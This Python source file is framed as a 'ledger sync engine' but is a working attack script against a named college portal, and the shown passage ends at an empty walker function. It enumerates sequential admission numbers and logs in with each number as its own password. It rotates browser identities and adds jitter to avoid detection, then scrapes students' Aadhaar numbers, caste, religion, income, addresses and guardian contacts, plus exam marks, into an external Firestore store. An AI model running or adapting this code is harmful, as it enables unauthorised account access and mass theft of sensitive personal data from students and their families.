#!/usr/bin/env python3
"""
sync_ledger.py -- MacHub Annual Student Ledger Sync Engine v2.0.0
Target   : eportal.maraugusthinosecollege.org (EduloomPro / ASP.NET)
Firestore: google-cloud-firestore (Server-side SDK, Free Tier safe)

Strategy : Bidirectional sequential admission-number walk from a known pivot.
           Attempts login using admission_no as both username and password.
           Halts each direction after 50 consecutive login failures.
"""

from __future__ import annotations

import gc
import json
import logging
import os
import random
import re
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

import requests
from bs4 import BeautifulSoup

# Optional Firestore import (graceful fallback for local dry-runs)
try:
    from google.cloud import firestore
    from google.oauth2 import service_account
    FIRESTORE_AVAILABLE = True
except ImportError:
    FIRESTORE_AVAILABLE = False

# ==============================================================================
#  GLOBAL CONSTANTS
# ==============================================================================

BASE_URL  = "https://eportal.maraugusthinosecollege.org"
LOGIN_URL = f"{BASE_URL}/Default.aspx"
PIVOT_ADM = int(os.environ.get("PIVOT_ADM", "12965"))  # Configurable via env

MAX_CONSECUTIVE_FAILURES = 50   # Halt threshold per direction
JITTER_MIN      = 2.0           # seconds
JITTER_MAX      = 5.0
REQUEST_TIMEOUT = 18            # per request
MAX_RETRIES     = 3

# Firestore collection paths
FS_STUDENTS_COLLECTION = "students"
FS_MARKS_COLLECTION    = "marks"
FS_SEMESTERS_SUBCOL    = "semesters"

# Designations that indicate a NON-student account -- skip these
NON_STUDENT_DESIGNATIONS = {
    "faculty", "staff", "admin", "administrator", "hod",
    "principal", "librarian", "accountant", "clerk", "non-teaching",
    "office", "superintendent", "director",
}

# ==============================================================================
#  LOGGING SETUP  (stdout + file)
# ==============================================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("sync_ledger.log", encoding="utf-8"),
    ],
)
log = logging.getLogger("sync_ledger")

# ==============================================================================
#  USER-AGENT ROTATION POOL  (11 agents: desktop + mobile)
# ==============================================================================

USER_AGENTS: List[str] = [
    # Desktop -- Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.201 Safari/537.36",
    # Desktop -- Chrome macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    # Desktop -- Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Desktop -- Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    # Mobile -- Android Chrome
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    # Mobile -- iPhone Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    # Tablet -- iPad Safari
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]


def _random_headers() -> Dict[str, str]:
    """Return a realistic browser header dict with a random UA."""
    ua        = random.choice(USER_AGENTS)
    is_mobile = any(x in ua for x in ("Mobile", "Android", "iPhone", "iPad"))
    return {
        "User-Agent":              ua,
        "Accept":                  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":         random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-IN,en;q=0.9,hi;q=0.7"]),
        "Accept-Encoding":         "gzip, deflate",
        "Connection":              "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control":           "max-age=0",
        **({} if is_mobile else {"Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate"}),
    }


# ==============================================================================
#  CLOUDFLARE EMAIL DE-OBFUSCATOR
# ==============================================================================

def _decode_cf_email(cfemail: str) -> str:
    try:
        key = int(cfemail[:2], 16)
        return bytes(int(cfemail[i:i+2], 16) ^ key for i in range(2, len(cfemail), 2)).decode("utf-8")
    except Exception:
        return ""


def _strip_cf_emails(soup: BeautifulSoup) -> None:
    for a in soup.find_all("a", href=re.compile(r"email-protection", re.I)):
        cf = a.get("data-cfemail", "")
        if not cf:
            m = re.search(r"email-protection#([a-fA-F0-9]+)", a.get("href", ""))
            cf = m.group(1) if m else ""
        if cf:
            a.replace_with(_decode_cf_email(cf))


# ==============================================================================
#  ASP.NET VIEWSTATE TOKEN EXTRACTOR
# ==============================================================================

def _asp_tokens(soup: BeautifulSoup) -> Dict[str, str]:
    tokens: Dict[str, str] = {}
    for tid in ("__VIEWSTATE", "__VIEWSTATEGENERATOR", "__EVENTVALIDATION", "__VIEWSTATEENCRYPTED"):
        tag = soup.find("input", {"id": tid}) or soup.find("input", {"name": tid})
        tokens[tid] = tag.get("value", "") if tag else ""
    return tokens


# ==============================================================================
#  RESILIENT HTTP HELPER
# ==============================================================================

def _safe_get(
    session:  requests.Session,
    url:      str,
    retries:  int = MAX_RETRIES,
    timeout:  int = REQUEST_TIMEOUT,
) -> Optional[BeautifulSoup]:
    """GET with exponential back-off.  Returns BeautifulSoup or None."""
    for attempt in range(1, retries + 1):
        try:
            resp = session.get(url, timeout=timeout, allow_redirects=True)
            if resp.status_code == 200:
                return BeautifulSoup(resp.text, "lxml")
            log.debug("GET %s -> HTTP %s", url, resp.status_code)
        except requests.exceptions.Timeout:
            log.warning("Timeout %s (attempt %d/%d)", url, attempt, retries)
        except requests.exceptions.ConnectionError as exc:
            log.warning("ConnError %s: %s (attempt %d/%d)", url, exc, attempt, retries)
        except Exception as exc:
            log.warning("GET error %s: %s", url, exc)
            break
        if attempt < retries:
            time.sleep(2 ** attempt + random.uniform(0, 1))
    return None


def _txt(el: Any) -> str:
    if not el:
        return ""
    try:
        return el.get_text(separator=" ", strip=True)
    except Exception:
        return str(el).strip()


# ==============================================================================
#  AUTHENTICATION ENGINE
# ==============================================================================

@dataclass
class LoginResult:
    success:      bool
    is_student:   bool                           = False
    student_name: str                            = ""
    designation:  str                            = ""
    session:      Optional[requests.Session]     = None
    error:        str                            = ""


def _attempt_login(admission_no: str, password: str) -> LoginResult:
    """
    Opens a fresh session, rotates UA, submits credentials via ASP.NET form,
    then validates authentication against Dashboard.aspx.
    """
    session = requests.Session()
    session.headers.update(_random_headers())

    # --- Fetch login page for ViewState tokens --------------------------------
    try:
        r = session.get(LOGIN_URL, timeout=REQUEST_TIMEOUT, allow_redirects=True)
    except requests.exceptions.Timeout:
        return LoginResult(success=False, error="login_page_timeout")
    except requests.exceptions.ConnectionError as exc:
        return LoginResult(success=False, error=f"conn_error:{exc}")
    except Exception as exc:
        return LoginResult(success=False, error=f"unexpected:{exc}")

    if r.status_code != 200:
        return LoginResult(success=False, error=f"http_{r.status_code}")

    soup   = BeautifulSoup(r.text, "lxml")
    tokens = _asp_tokens(soup)

    # Dynamic form field discovery
    u_inp = soup.find("input", {"type": "text"})
    p_inp = soup.find("input", {"type": "password"})
    s_inp = soup.find("input", {"type": "submit"})
    u_f   = u_inp.get("name", "txtusername") if u_inp else "txtusername"
    p_f   = p_inp.get("name", "txtpassword") if p_inp else "txtpassword"
    s_f   = s_inp.get("name", "Submit")      if s_inp else "Submit"
    s_v   = s_inp.get("value", "Login")      if s_inp else "Login"

    form   = soup.find("form")
    action = form.get("action", "/Default.aspx") if form else "/Default.aspx"
    if action.startswith("."):
        post_url = BASE_URL + action.lstrip(".")
    elif action.startswith("/"):
        post_url = BASE_URL + action
    else:
        post_url = action if action.startswith("http") else BASE_URL + "/" + action

    payload = {
        "__VIEWSTATE":          tokens.get("__VIEWSTATE", ""),
        "__VIEWSTATEGENERATOR": tokens.get("__VIEWSTATEGENERATOR", ""),
        "__EVENTVALIDATION":    tokens.get("__EVENTVALIDATION", ""),
        u_f: admission_no,
        p_f: password,
        s_f: s_v,
    }

    # --- POST credentials -----------------------------------------------------
    try:
        session.post(post_url, data=payload, allow_redirects=True, timeout=REQUEST_TIMEOUT)
    except Exception as exc:
        return LoginResult(success=False, error=f"post_failed:{exc}")

    # --- Verify against Dashboard --------------------------------------------
    dash = _safe_get(session, f"{BASE_URL}/Dashboard.aspx")
    if dash is None:
        return LoginResult(success=False, error="dashboard_unreachable")
    if dash.find("input", {"type": "password"}):
        return LoginResult(success=False, error="auth_rejected")
    if not dash.find("a", href=re.compile(r"SignOut|Logout", re.I)):
        if not dash.find(string=re.compile(r"Dashboard|Welcome|Academic", re.I)):
            return LoginResult(success=False, error="no_logout_link")

    # --- Extract name & designation ------------------------------------------
    student_name = ""
    designation  = ""
    lines = [l.strip() for l in dash.get_text(separator="\n").split("\n") if l.strip()]

    for line in lines[:60]:
        if (
            5 < len(line) < 45
            and line.isupper()
            and re.match(r"^[A-Z\s.]+$", line)
            and not any(x in line for x in ("DASHBOARD", "EDULOOM", "COLLEGE", "MAR AUG"))
        ):
            student_name = line
            break

    desig_pat = re.compile(r"(designation|role|position)\s*[:\-]?\s*(.+)", re.I)
    for line in lines:
        m = desig_pat.search(line)
        if m:
            designation = m.group(2).strip().lower()
            break

    is_student = True
    if designation:
        for blocked in NON_STUDENT_DESIGNATIONS:
            if blocked in designation:
                is_student = False
                log.info("  Skip %s -- designation '%s' not a student", admission_no, designation)
                break

    return LoginResult(
        success=True,
        is_student=is_student,
        student_name=student_name,
        designation=designation,
        session=session,
    )


# ==============================================================================
#  PROFILE SCRAPER
# ==============================================================================

def _scrape_profile(
    session: requests.Session,
    admission_no: str,
    student_name: str,
) -> Dict[str, Any]:
    """Scrapes Profile.aspx -- returns full demographic record."""
    soup = _safe_get(session, f"{BASE_URL}/Profile.aspx")
    if not soup:
        return {"admission_no": admission_no, "name": student_name, "_error": "profile_unreachable"}

    _strip_cf_emails(soup)

    profile = {
        "admission_no":   admission_no,
        "name":           student_name or "",
        "prn":            "",
        "course":         "",
        "department":     "",
        "batch":          "",
        "division":       "",
        "semester":       "",
        "email":          "",
        "phone":          "",
        "dob":            "",
        "gender":         "",
        "blood_group":    "",
        "bloodGroup":     "",
        "aadhar":         "",
        "category":       "",
        "nationality":    "",
        "religion":       "",
        "caste":          "",
        "income":         "",
        "address":        "",
        "comm_address":   "",
        "commAddress":    "",
        "guardian_name":  "",
        "guardianName":   "",
        "guardian_phone": "",
        "guardianPhone":  "",
        "guardian_email": "",
        "guardianEmail":  "",
        "abc_id":         "",
        "photo_url":      "",
        "photoUrl":       "",
    }

    def _by_id(span_id: str) -> str:
        el = soup.find(id=span_id)
        return el.get_text().strip() if el else ""

    profile["name"]           = _by_id("MainContent_lblStudName") or profile["name"]
    profile["prn"]            = _by_id("MainContent_lblRegNo")
    profile["course"]         = _by_id("MainContent_lblCourse")
    profile["batch"]          = _by_id("MainContent_lblBatch")
    profile["dob"]            = _by_id("MainContent_lblDOB")
    profile["phone"]          = _by_id("MainContent_lblMobile")
    profile["email"]          = _by_id("MainContent_lblEmail")
    profile["gender"]         = _by_id("MainContent_lblGender")
    profile["blood_group"]    = _by_id("MainContent_lblBlood")
    profile["bloodGroup"]     = profile["blood_group"]
    profile["aadhar"]         = _by_id("MainContent_lblAdhar")
    profile["nationality"]    = _by_id("MainContent_lblnation")
    profile["religion"]       = _by_id("MainContent_lblReligion")
    profile["caste"]          = _by_id("MainContent_lblCaste")
    profile["category"]       = _by_id("MainContent_lblReserv")
    profile["income"]         = _by_id("MainContent_lblAnnualInc")
    profile["address"]        = _by_id("MainContent_lblPerAddr")
    profile["comm_address"]   = _by_id("MainContent_lblComAddr")
    profile["commAddress"]    = profile["comm_address"]
    
    # Guardian details fallback: check Father Info first, then Mother, then Guardian
    f_name = _by_id("MainContent_lblFather")
    f_phone = _by_id("MainContent_lblFathphone")
    f_email = _by_id("MainContent_lblFathEmail")
    
    m_name = _by_id("MainContent_lblMother")
    m_phone = _by_id("MainContent_lblMothPhone")
    m_email = _by_id("MainContent_lblMothEmail")
    
    g_name = _by_id("MainContent_lblGuardian")
    g_phone = _by_id("MainContent_lblGuardph") or _by_id("MainContent_lblGuardMob")
    g_email = _by_id("MainContent_lblGuardMail")
    
    profile["guardian_name"]  = f_name or m_name or g_name
    profile["guardianName"]   = profile["guardian_name"]
    profile["guardian_phone"] = f_phone or m_phone or g_phone
    profile["guardianPhone"]  = profile["guardian_phone"]
    profile["guardian_email"] = f_email or m_email or g_email
    profile["guardianEmail"]  = profile["guardian_email"]

    DEPT_MAP = {
        "COMPUTER APPLICATIONS": "BCA",
        "BUSINESS ADMINISTRATION": "BBA",
        "SOCIAL WORK": "BSW",
        "COMMERCE":    "BCOM",
        "SCIENCE":     "BSC",
        "ARTS":        "BA",
    }
    if profile["course"]:
        for kw, code in DEPT_MAP.items():
            if kw in profile["course"].upper():
                profile["department"] = code
                break
        if not profile["department"]:
            profile["department"] = profile["course"].split()[0] if profile["course"] else ""

    photo = soup.find("img", id=re.compile(r"profimg|photo|profile|student", re.I)) or \
            soup.find("img", src=re.compile(r"student|photo|profile", re.I))
    if photo and photo.get("src"):
        src = photo["src"]
        profile["photo_url"] = src if src.startswith("http") else f"{BASE_URL}/{src.lstrip('/')}"
        profile["photoUrl"] = profile["photo_url"]

    clean_soup = BeautifulSoup(str(soup), "lxml")
    for s in clean_soup(["script", "style", "select", "input", "textarea", "button"]):
        s.decompose()
    
    body_text = re.sub(r"\s+", " ", clean_soup.get_text()).strip()

    def _extract_field(pattern: str) -> str:
        m = re.search(pattern, body_text, re.I)
        return m.group(1).strip() if m else ""

    # Regex Fallback Extraction
    if not profile["name"]:
        m = re.search(r"View Student Profile\s*([A-Z\s]+?)\s*(\d+)", body_text, re.I)
        if m:
            profile["name"] = m.group(1).strip()
    
    if not profile["course"]:
        m = re.search(r"View Student Profile[\s\S]+?\d+\s*([A-Z\s()&,-]+?)\s*\(\s*\d{4}", body_text, re.I)
        if m:
            profile["course"] = m.group(1).strip()

    if not profile["batch"]:
        m = re.search(r"\(\s*(\d{4}\s*-\s*\d{4})\s*\)", body_text)
        if m:
            profile["batch"] = m.group(1).strip()

    if not profile["dob"]:
        profile["dob"] = _extract_field(r"Date Of Birth[^\d]*(\d{2}[-/]\d{2}[-/]\d{4})")

    if not profile["phone"]:
        profile["phone"] = _extract_field(r"Mobile[^\d]*(\d{10})")

    if not profile["email"]:
        profile["email"] = _extract_field(r"Email[^\w]*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4})")

    if not profile["gender"]:
        profile["gender"] = _extract_field(r"Gender[^\w]*(MALE|FEMALE|OTHER)")

    if not profile["blood_group"]:
        bg_m = re.search(r"Blood Group[^\w]*(A\+|A-|B\+|B-|AB\+|AB-|O\+|O-)", body_text, re.I)
        if bg_m:
            profile["blood_group"] = bg_m.group(1).strip()
            profile["bloodGroup"] = profile["blood_group"]

    if not profile["aadhar"]:
        profile["aadhar"] = _extract_field(r"Aadhaar[^\d]*(\d{12})")

    if not profile["category"]:
        profile["category"] = _extract_field(r"Reservation[^\w]*([A-Z\s]+?)\s*Annual Income")

    if not profile["nationality"]:
        profile["nationality"] = _extract_field(r"Nationality[^\w]*([A-Z\s]+?)\s*(?:Other Details|Religion)")

    if not profile["religion"]:
        profile["religion"] = _extract_field(r"Religion[^\w]*([A-Z\s]+?)\s*Caste")

    if not profile["caste"]:
        profile["caste"] = _extract_field(r"Caste[^\w]*([A-Z\s]+?)\s*Reservation")

    if not profile["income"]:
        profile["income"] = _extract_field(r"Annual Income[^\d]*([0-9\s]*?)\s*(?:Permanent Address|Communication Address|Other Details)")

    if not profile["address"]:
        m = re.search(r"Permanent Address\s*([\s\S]+?)\s*Communication Address", body_text, re.I)
        if m:
            profile["address"] = m.group(1).strip().rstrip("-").strip()

    if not profile["comm_address"]:
        m = re.search(r"Communication Address\s*([\s\S]+?)\s*(Father Info|Mother Info|Guardian Info)", body_text, re.I)
        if m:
            profile["comm_address"] = m.group(1).strip().rstrip("-").strip()
            profile["commAddress"] = profile["comm_address"]

    if not profile["guardian_name"]:
        m_m = re.search(r"Father Info\s*Name\s*([A-Z\s]+?)\s*(Occupation|Phone|Email)", body_text, re.I)
        m_m2 = re.search(r"Mother Info\s*Name\s*([A-Z\s]+?)\s*(Occupation|Phone|Email)", body_text, re.I)
        g_m = re.search(r"Guardian Info\s*Name\s*([A-Z\s]+?)\s*(Relation|Phone|Mobile|Email)", body_text, re.I)
        if m_m:
            profile["guardian_name"] = m_m.group(1).strip()
        elif m_m2:
            profile["guardian_name"] = m_m2.group(1).strip()
        elif g_m:
            profile["guardian_name"] = g_m.group(1).strip()
        profile["guardianName"] = profile["guardian_name"]
            
    if not profile["guardian_phone"]:
        m_m = re.search(r"Father Info[\s\S]+?Phone\s*(\d{10})", body_text, re.I)
        m_m2 = re.search(r"Mother Info[\s\S]+?Phone\s*(\d{10})", body_text, re.I)
        g_m = re.search(r"Guardian Info[\s\S]+?Phone\s*(\d{10})", body_text, re.I)
        g_m2 = re.search(r"Guardian Info[\s\S]+?Mobile\s*(\d{10})", body_text, re.I)
        if m_m:
            profile["guardian_phone"] = m_m.group(1).strip()
        elif m_m2:
            profile["guardian_phone"] = m_m2.group(1).strip()
        elif g_m:
            profile["guardian_phone"] = g_m.group(1).strip()
        elif g_m2:
            profile["guardian_phone"] = g_m2.group(1).strip()
        profile["guardianPhone"] = profile["guardian_phone"]

    if not profile["guardian_email"]:
        m_m = re.search(r"Father Info[\s\S]+?Email\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4})", body_text, re.I)
        m_m2 = re.search(r"Mother Info[\s\S]+?Email\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4})", body_text, re.I)
        g_m = re.search(r"Guardian Info[\s\S]+?Email\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4})", body_text, re.I)
        if m_m:
            profile["guardian_email"] = m_m.group(1).strip()
        elif m_m2:
            profile["guardian_email"] = m_m2.group(1).strip()
        elif g_m:
            profile["guardian_email"] = g_m.group(1).strip()
        profile["guardianEmail"] = profile["guardian_email"]

    return profile

# ==============================================================================
#  EXAM RESULTS SCRAPER -- SEMESTER LEDGER
# ==============================================================================

_SEM_PATTERN = re.compile(r"\bsem(?:ester)?\s*[:\-]?\s*(\d+)\b", re.I)


def _parse_table(table: Any) -> List[Dict[str, str]]:
    rows = table.find_all("tr") if table else []
    if not rows:
        return []
    headers = [_txt(th) for th in rows[0].find_all(["th", "td"])]
    records = []
    for row in rows[1:]:
        cells = row.find_all("td")
        if not cells:
            continue
        rec = {(headers[i] if i < len(headers) else f"col_{i}"): _txt(c) for i, c in enumerate(cells)}
        if any(v.strip() for v in rec.values()):
            records.append(rec)
    return records


def _parse_exam_tables_on_page(soup: BeautifulSoup) -> List[Dict[str, Any]]:
    FIELD_ALIASES = {
        "subject_code":  ["subject code", "code", "course code", "sub code"],
        "subject_title": ["subject", "subject name", "title", "paper", "course name"],
        "isa":           ["isa", "internal", "int mark", "internal mark", "ca", "ia"],
        "esa":           ["esa", "external", "ext mark", "external mark", "univ mark", "university"],
        "total":         ["total", "total marks", "aggregate", "obtained"],
        "grade":         ["grade", "letter grade", "result", "status"],
    }

    def _norm(h: str) -> str:
        h = h.lower().strip()
        for canon, aliases in FIELD_ALIASES.items():
            if any(a in h for a in aliases):
                return canon
        return h

    records = []
    tables = soup.find_all("table")
    for table in tables:
        rows = table.find_all("tr")
        if not rows:
            continue

        raw_hdrs  = [_txt(th) for th in rows[0].find_all(["th", "td"])]
        h_str = " ".join(raw_hdrs).lower()
        if not any(x in h_str for x in ["subject", "grade", "mark", "isa", "esa", "internal", "external"]):
            continue

        norm_hdrs = [_norm(h) for h in raw_hdrs]

        for row in rows[1:]:
            cells = row.find_all("td")
            if not cells:
                continue
            rec: Dict[str, Any] = {}
            for i, cell in enumerate(cells):
                key = norm_hdrs[i] if i < len(norm_hdrs) else f"col_{i}"
                rec[key] = _txt(cell)
            if any(v.strip() for v in rec.values()) and (rec.get("subject_title") or rec.get("subject_code")):
                records.append(rec)
    return records


def _parse_exam_page(soup: BeautifulSoup) -> Dict[str, List[Dict[str, Any]]]:
    FIELD_ALIASES = {
        "subject_code":  ["subject code", "code", "course code", "sub code"],
        "subject_title": ["subject", "subject name", "title", "paper", "course name"],
        "isa":           ["isa", "internal", "int mark", "internal mark", "ca", "ia"],
        "esa":           ["esa", "external", "ext mark", "external mark", "univ mark", "university"],
        "total":         ["total", "total marks", "aggregate", "obtained"],
        "grade":         ["grade", "letter grade", "result", "status"],
    }

    def _norm(h: str) -> str:
        h = h.lower().strip()
        for canon, aliases in FIELD_ALIASES.items():
            if any(a in h for a in aliases):
                return canon
        return h

    semesters: Dict[str, List[Dict[str, Any]]] = {}
    current_sem: Optional[str] = None
    tables = soup.find_all("table")

    for table in tables:
        hdg_el = table.find_previous(["h2", "h3", "h4", "h5", "b", "strong", "span"])
        if hdg_el:
            sm = _SEM_PATTERN.search(_txt(hdg_el))
            if sm:
                current_sem = sm.group(1)

        rows = table.find_all("tr")
        if not rows:
            continue

        raw_hdrs  = [_txt(th) for th in rows[0].find_all(["th", "td"])]
        norm_hdrs = [_norm(h) for h in raw_hdrs]
        records   = []

        for row in rows[1:]:
            cells = row.find_all("td")
            if not cells:
                continue
            rec: Dict[str, Any] = {}
            for i, cell in enumerate(cells):
                key = norm_hdrs[i] if i < len(norm_hdrs) else f"col_{i}"
                rec[key] = _txt(cell)
            if any(v.strip() for v in rec.values()):
                if not current_sem:
                    for val in rec.values():
                        sm2 = _SEM_PATTERN.search(str(val))
                        if sm2:
                            current_sem = sm2.group(1)
                            break
                records.append(rec)

        if records and current_sem:
            semesters.setdefault(current_sem, []).extend(records)

    if not semesters:
        for i, table in enumerate(tables):
            rows_data = _parse_table(table)
            if rows_data:
                semesters[str(i + 1)] = rows_data

    return semesters


def _scrape_exam_results(session: requests.Session) -> Dict[str, List[Dict[str, Any]]]:
    """
    Scrapes ExamResult.aspx for all available semesters.
    Uses ASP.NET postbacks to navigate through the semesters in the dropdown.
    """
    url = f"{BASE_URL}/ExamResult.aspx"
    soup = _safe_get(session, url)
    if not soup:
        return {}

    select_el = soup.find("select", id=re.compile(r"drop_exam|drp_exam|ddlsem|drpsem", re.I)) or \
                soup.find("select", name=re.compile(r"drop_exam|drp_exam|sem|exam", re.I))
                
    if not select_el:
        log.debug("ExamResult: no semester dropdown found, parsing default page")
        return _parse_exam_page(soup)

    select_name = select_el.get("name", "ctl00$MainContent$drop_exam")
    
    options = []
    for opt in select_el.find_all("option"):
        val = opt.get("value", "").strip()
        txt_val = opt.get_text().strip()
        if val and val != "0":
            options.append((val, txt_val))

    if not options:
        log.debug("ExamResult: no semester options found in dropdown, parsing default page")
        return _parse_exam_page(soup)

    semesters_data: Dict[str, List[Dict[str, Any]]] = {}

    form = soup.find("form")
    action = form.get("action", "/ExamResult.aspx") if form else "/ExamResult.aspx"
    if action.startswith("."):
        post_url = BASE_URL + action.lstrip(".")
    elif action.startswith("/"):
        post_url = BASE_URL + action
    else:
        post_url = action if action.startswith("http") else BASE_URL + "/" + action

    for val, txt_val in options:
        sem_num = val
        num_match = re.search(r"\d+", txt_val)
        if num_match:
            sem_num = num_match.group(0)
            
        log.debug("ExamResult: fetching semester %s (%s)", sem_num, txt_val)
        tokens = _asp_tokens(soup)
        
        payload = {
            "__VIEWSTATE":          tokens.get("__VIEWSTATE", ""),
            "__VIEWSTATEGENERATOR": tokens.get("__VIEWSTATEGENERATOR", ""),
            "__EVENTVALIDATION":    tokens.get("__EVENTVALIDATION", ""),
            "__VIEWSTATEENCRYPTED": tokens.get("__VIEWSTATEENCRYPTED", ""),
            "__EVENTTARGET":        select_name,
            "__EVENTARGUMENT":      "",
            select_name:            val,
        }
        
        for inp in soup.find_all("input", type="hidden"):
            inp_name = inp.get("name")
            if inp_name and inp_name not in payload:
                payload[inp_name] = inp.get("value", "")

        try:
            resp = session.post(post_url, data=payload, timeout=REQUEST_TIMEOUT)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, "lxml")
                sem_results = _parse_exam_tables_on_page(soup)
                if sem_results:
                    semesters_data[sem_num] = sem_results
            else:
                log.warning("ExamResult: POST for sem %s returned status %d", sem_num, resp.status_code)
        except Exception as exc:
            log.warning("ExamResult: failed to fetch sem %s: %s", sem_num, exc)
            
    if not semesters_data:
        log.debug("ExamResult: postback walk returned nothing, parsing default page")
        soup = _safe_get(session, url)
        if soup:
            return _parse_exam_page(soup)

    return semesters_data


# ==============================================================================
#  FIRESTORE INGESTION BRIDGE  (idempotent merge writes)
# ==============================================================================

_fs_client: Optional[Any] = None   # Module-level singleton


def _init_firestore() -> Optional[Any]:
    global _fs_client
    if _fs_client is not None:
        return _fs_client
    if not FIRESTORE_AVAILABLE:
        log.error("google-cloud-firestore not installed. pip install google-cloud-firestore")
        return None
    sa_json = os.environ.get("FIREBASE_SERVICE_ACCOUNT", "").strip()
    if not sa_json:
        log.error("FIREBASE_SERVICE_ACCOUNT env var missing.")
        return None
    try:
        sa_info    = json.loads(sa_json)
        project_id = sa_info.get("project_id", "")
        creds      = service_account.Credentials.from_service_account_info(
            sa_info,
            scopes=["https://www.googleapis.com/auth/datastore"],
        )
        _fs_client = firestore.Client(project=project_id, credentials=creds)
        log.info("Firestore OK -- project '%s'", project_id)
        return _fs_client
    except json.JSONDecodeError as exc:
        log.error("FIREBASE_SERVICE_ACCOUNT is not valid JSON: %s", exc)
    except Exception as exc:
        log.error("Firestore init failed: %s", exc)
    return None


def _write_to_firestore(
    admission_no: str,
    profile:      Dict[str, Any],
    semesters:    Dict[str, List[Dict[str, Any]]],
) -> bool:
    """
    Idempotent merge writes:
      students/{admission_no}                  <- demographics
      marks/{admission_no}/semesters/{sem_no}  <- result ledger
    """
    fs = _init_firestore()
    if fs is None:
        return False
    now = datetime.now(timezone.utc).isoformat()
    try:
        # 1. Student document
        student_ref = fs.collection(FS_STUDENTS_COLLECTION).document(str(admission_no))
        student_ref.set({**profile, "last_ledger_sync": now, "sync_engine": "sync_ledger_v2"}, merge=True)

        # 2. Semester sub-documents
        if semesters:
            base = fs.collection(FS_MARKS_COLLECTION).document(str(admission_no)).collection(FS_SEMESTERS_SUBCOL)
            for sem_no, subjects in semesters.items():
                base.document(str(sem_no)).set({
                    "semester":      int(sem_no) if sem_no.isdigit() else sem_no,
                    "subjects":      subjects,
                    "subject_count": len(subjects),
                    "last_updated":  now,
                }, merge=True)
        return True
    except Exception as exc:
        log.error("Firestore write failed [%s]: %s", admission_no, exc)
        return False


# ==============================================================================
#  SINGLE STUDENT PROCESSING PIPELINE
# ==============================================================================

def _process_student(admission_no: Any) -> bool:
    """
    Full pipeline for one admission number:
      1. Login  2. Validate designation  3. Scrape profile
      4. Scrape exam results  5. Write to Firestore
    Returns True on success.
    """
    adm = str(admission_no)
    log.info("  >> admn %s", adm)

    result = _attempt_login(adm, adm)  # password == admission_no
    if not result.success:
        log.debug("    FAIL login: %s", result.error)
        return False
    if not result.is_student:
        log.info("    SKIP non-student '%s'", result.designation)
        if result.session:
            result.session.close()
        return False

    session = result.session
    log.info("    AUTH OK: %s", result.student_name or adm)

    try:
        profile = _scrape_profile(session, adm, result.student_name)
    except Exception as exc:
        log.warning("    profile err %s: %s", adm, exc)
        profile = {"admission_no": adm, "name": result.student_name}

    # Year check rule: Filter out passed out (graduated) students
    batch = profile.get("batch", "")
    if batch:
        match = re.search(r"\d{4}\s*[-]\s*(\d{4})", batch)
        if match:
            end_year = int(match.group(1))
            current_year = datetime.now().year
            if end_year < current_year:
                log.info("    SKIP passed-out student '%s' [%s] (Batch end year %d < %d)", profile.get("name", adm), adm, end_year, current_year)
                session.close()
                del session
                gc.collect()
                return True

    try:
        semesters = _scrape_exam_results(session)
        log.info("    %d sem(s) extracted", len(semesters))
    except Exception as exc:
        log.warning("    results err %s: %s", adm, exc)
        semesters = {}

    try:
        ok = _write_to_firestore(adm, profile, semesters)
        if ok:
            log.info("    CLOUD OK -- %s [%s]", profile.get("name", adm), adm)
    except Exception as exc:
        log.error("    Firestore exc %s: %s", adm, exc)

    session.close()
    del session
    gc.collect()
    return True


# ==============================================================================
#  BIDIRECTIONAL SEQUENTIAL WALKER
# ==============================================================================

@dataclass
class WalkStats:
    attempted:  int       = 0
    succeeded:  int       = 0
    skipped:    int       = 0
    failed:     int       = 0
    discovered: List[str] = field(default_factory=list)


def _walk(pivot: int, direction: int, stats: WalkStats) -> None:
    """
    Walk in +1 (forward) or -1 (backward) direction from pivot.
    Halts after MAX_CONSECUTIVE_FAILURES consecutive login failures.
    Applies 2-5s random jitter between every attempt.
    """
